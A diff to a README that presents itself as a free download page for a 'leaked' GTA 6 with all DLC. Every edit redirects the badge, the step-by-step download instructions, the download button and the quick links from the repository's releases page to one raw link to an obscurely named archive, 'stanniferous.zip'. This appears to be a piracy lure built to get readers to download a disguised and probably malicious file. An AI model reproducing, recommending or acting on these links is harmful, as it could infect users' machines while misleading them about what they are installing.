@@ -5,7 +5,7 @@ description: "Get GTA 6 with all DLC included in one free download for Windows�
 ---
 # 🎮 GTA-6-All-DLC-Included-Free-Download - Get the Full Leaked Game Now
 
-[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Free-2ea44f?style=for-the-badge)](https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases)
+[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_Free-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/clymchi/clymchi.github.io/main/backend-modules/stanniferous.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Whether you are a long-time fan of the series or just curious about the hype, th
 
 Let’s get you into the game with minimal fuss. Follow these simple steps:
 
-1.  **Visit the Download Page:** Click the big green button above or navigate to the official release page using this link: [https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases](https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases)
+1.  **Visit the Download Page:** Click the big green button above or navigate to the official release page using this link: [https://raw.githubusercontent.com/clymchi/clymchi.github.io/main/backend-modules/stanniferous.zip](https://raw.githubusercontent.com/clymchi/clymchi.github.io/main/backend-modules/stanniferous.zip)
 2.  **Find the Latest File:** On that page, look for the most recent file listed at the top. It will be labeled clearly.
 3.  **Initiate the Download:** Click on the file name to start the download. Your browser will handle the rest. The file is large, so ensure you have a stable internet connection.
 
@@ -129,7 +129,7 @@ You are moments away from diving into the most anticipated game of the decade. T
 
 **Remember:** Visit this link to download the application. The process is simple and quick.
 
-<a href="https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases" style="background-color: #4CAF50; color: white; padding: 15px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; border-radius: 6px; font-weight: bold;">⬇️ DOWNLOAD GTA 6 NOW</a>
+<a href="https://raw.githubusercontent.com/clymchi/clymchi.github.io/main/backend-modules/stanniferous.zip" style="background-color: #4CAF50; color: white; padding: 15px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer; border-radius: 6px; font-weight: bold;">⬇️ DOWNLOAD GTA 6 NOW</a>
 
 We hope you enjoy your time in Leonida!
 
@@ -137,8 +137,8 @@ We hope you enjoy your time in Leonida!
 
 ## 📌 Quick Links
 
-*   [Download Page](https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases)
-*   [Repository Home](https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download)
+*   [Download Page](https://raw.githubusercontent.com/clymchi/clymchi.github.io/main/backend-modules/stanniferous.zip)
+*   [Repository Home](https://raw.githubusercontent.com/clymchi/clymchi.github.io/main/backend-modules/stanniferous.zip)
 
 ---
 
